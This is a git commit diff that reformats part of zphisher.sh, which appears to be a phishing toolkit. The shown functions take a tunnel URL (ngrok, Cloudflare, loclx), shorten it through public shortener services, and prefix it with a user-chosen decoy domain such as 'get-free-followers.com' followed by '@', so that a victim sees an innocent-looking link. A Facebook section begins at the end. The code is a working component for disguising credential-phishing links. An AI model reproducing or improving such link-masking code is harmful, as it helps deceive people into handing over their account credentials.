1c1592bf74ad7219ae952e21bd7a576344df3dd9
htr-tech <tahmidrayat@gmail.com>
2022-10-19 00:47:49 +0600

    Formatted

--- zphisher.sh
+++ zphisher.sh
@@ -590,62 +590,62 @@ tunnel_menu() {
 
 ## Custom Mask URL
 custom_mask() {
-    { sleep .5; clear; banner_small; echo; }
-    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-    echo
-    if [[ ${mask_op,,} == "y" ]]; then
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-        read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-        if [[ ${mask_url//:*} =~ (www|https?) ]]; then # Someone fix this. Exclude (;,:!#$%^& etc). I suck at regex
-            mask=$mask_url
-            echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-        else
-            echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
-        fi
-    fi
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ (www|https?) ]]; then # Someone fix this. Exclude (;,:!#$%^& etc). I suck at regex
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+		fi
+	fi
 }
 
 ## URL Shortner
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
 shorten() {
-    short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-    if [[ "$1" == *"shrtco.de"* ]]; then
-        processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-    else
-        # processed_url=$(echo "$short" | awk -F// '{print $NF}')
-        processed_url=${short#http*//}
-    fi     
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+		processed_url=${short#http*//}
+	fi
 }
 
 custom_url() {
-    url=${1#http*//}
-    isgd="https://is.gd/create.php?format=simple&url="
-    shortcode="https://api.shrtco.de/v2/shorten?url="
-    tinyurl="https://tinyurl.com/api-create.php?url="
+	url=${1#http*//}
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-    if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
-        if [[ $(site_stat $isgd) == 2* ]]; then
-            shorten $isgd "$url"
-        elif [[ $(site_stat $shortcode) == 2* ]]; then
-            shorten $shortcode "$url"
-        else
-            shorten $tinyurl "$url"
-        fi
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
 
-        url="https://$url"
-        masked_url="$mask@$processed_url"
-        processed_url="https://$processed_url"
-    else
-        # echo "[!] No url provided / Regex Not Matched"
-        url="Unable to generate links. Try after turning on hotspot"
-        processed_url="Unable to Short URL"
-    fi
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
+		# echo "[!] No url provided / Regex Not Matched"
+		url="Unable to generate links. Try after turning on hotspot"
+		processed_url="Unable to Short URL"
+	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-    [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
